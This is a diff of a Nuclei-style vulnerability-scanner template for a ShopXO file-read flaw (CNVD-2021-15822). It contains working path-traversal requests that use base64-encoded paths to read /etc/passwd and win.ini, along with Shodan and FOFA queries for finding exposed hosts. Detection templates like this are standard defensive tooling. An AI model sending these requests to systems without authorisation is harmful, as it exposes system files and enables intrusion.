@@ -1,22 +1,32 @@
 id: CNVD-2021-15822
 
 info:
-    name: ShopXO File Read
-    author: Print1n(http://print1n.top)
-    severity: high
-    reference:
-        - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
+  name: ShopXO Download File Read
+  author: pikpikcu
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
+  metadata:
+    verified: true
+    shodan-query: title:"ShopXO企业级B2C电商系统提供商"
+    fofa-query: app="ShopXO企业级B2C电商系统提供商"
+  tags: shopxo,lfi,cnvd,cnvd2021
 
-rules:
-    Linux0:
-        request:
-            method: GET
-            path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    Windows0:
-        request:
-            method: GET
-            path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
-        expression: response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
-expression: Linux0() || Windows0()
+http:
+  - raw:
+      - |
+        GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/03/17
